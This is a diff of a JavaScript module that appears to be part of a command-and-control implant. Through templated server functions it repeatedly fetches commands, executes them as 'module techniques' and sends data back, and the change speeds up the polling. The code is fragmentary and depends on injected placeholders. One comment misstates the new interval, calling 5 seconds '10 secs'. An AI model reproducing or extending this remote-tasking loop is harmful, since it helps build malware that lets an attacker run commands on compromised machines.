@@ -8,11 +8,11 @@
 let executedCmd = {{CC_EXECUTED_CMD_FN}};
 let getCmds = {{CC_GET_CMDS_FN}};
 let sendData = {{CC_SEND_DATA_FN}};
-let QUERY_CMDS_INTERVAL = 1 * 60 * 1000; // Get new cmds from server every 1 minute.
+let QUERY_CMDS_INTERVAL = 5 * 1000; // Get new cmds from server every 10 secs.
 let MODULE_NAME = 'proxy';
 //
 
-function execModulesWithParams(args_list) {
+function execModuleWithParams(args) {
 	for (let i=0; i<MODULE_TECHNIQUES.length; i++) {
 		MODULE_TECHNIQUES[i](...args);
 	}
@@ -35,10 +35,11 @@ function parseExecCmdsMail(cmds_list) {
 }
 
 
-function queryNewCmds() {
-	let cmds_list = getCmds();
-	parseExecCmdsMail(cmds_list);
+async function queryNewCmds() {
+	let cmds_list = await getCmds();
+	await parseExecCmdsMail(cmds_list);
 }
+
 
 function main() {
 	setInterval(queryNewCmds, QUERY_CMDS_INTERVAL);
